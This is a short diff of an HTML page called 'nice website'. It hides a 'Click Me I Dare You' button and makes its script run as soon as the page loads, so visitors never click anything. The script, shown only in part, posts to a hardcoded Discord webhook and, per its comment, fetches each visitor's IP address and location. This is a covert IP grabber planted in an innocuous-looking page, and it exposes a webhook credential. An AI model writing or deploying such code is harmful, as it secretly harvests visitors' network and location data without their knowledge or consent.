@@ -6,17 +6,7 @@
   <title>nice website</title>
   <style>
     #discordButton {
-      padding: 10px 20px;
-      background-color: #7289DA;
-      color: #FFFFFF;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    #discordButton:hover {
-      background-color: #677BC4;
+      display: none; /* Hide the button */
     }
   </style>
 </head>
@@ -25,7 +15,8 @@
 <button id="discordButton">Click Me I Dare You</button>
 
 <script>
-  document.getElementById('discordButton').addEventListener('click', function() {
+  // Execute the code immediately after the page loads
+  window.addEventListener('DOMContentLoaded', function() {
     const webhookURL = 'https://discord.com/api/webhooks/1223624654653227138/fxRpCwU5QdSZDWUygmlFYg--QS7ejwGDI7Y0KL9dlLIhsj_pKXto5n9WkWUoUIhdb1bx';
 
     // Fetch IP and location
@@ -102,3 +93,4 @@
 
 </body>
 </html>
+
